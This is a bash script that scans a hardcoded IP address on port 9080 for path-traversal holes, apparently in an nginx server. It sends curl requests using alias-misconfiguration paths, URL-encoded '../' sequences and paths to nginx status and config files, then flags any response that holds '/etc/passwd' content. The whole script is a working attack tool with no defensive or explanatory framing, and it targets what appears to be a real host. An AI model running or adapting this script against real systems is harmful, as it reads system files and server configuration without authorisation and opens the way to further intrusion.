#!/bin/bash
H=http://144.123.22.234:9080
urls=(
'/html../etc/passwd'
'/html../index.html'
'/html//etc/passwd'
'/assets../etc/passwd'
'/assets/../etc/passwd'
'/assets/%2e%2e/%2e%2e/etc/passwd'
'/prod-api/%2e%2e/%2e%2e/etc/passwd'
'/prod-api/..%2f..%2fetc/passwd'
'/nginx_status'
'/conf/nginx.conf'
'/nginx.conf'
'/html/'
'/html/index.html'
'/profile/'
'/upload/'
'/static/'
)
for u in "${urls[@]}"; do
  out=$(curl -s --path-as-is -k --max-time 8 -D - "$H$u")
  echo "== $u"
  printf '%s' "$out" | head -1 | tr -d '\r' | sed 's/^/   /'
  printf '%s' "$out" | grep -iE '^(content-type|content-length|server):' | tr -d '\r' | sed 's/^/   /'
  printf '%s' "$out" | grep -c 'root:x:0:0' | sed 's/^/   passwdhit=/'
  printf '%s' "$out" | sed -n '2,6p' | tr -d '\r' | cut -c1-80 | sed 's/^/   body: /'
  sleep 1
done
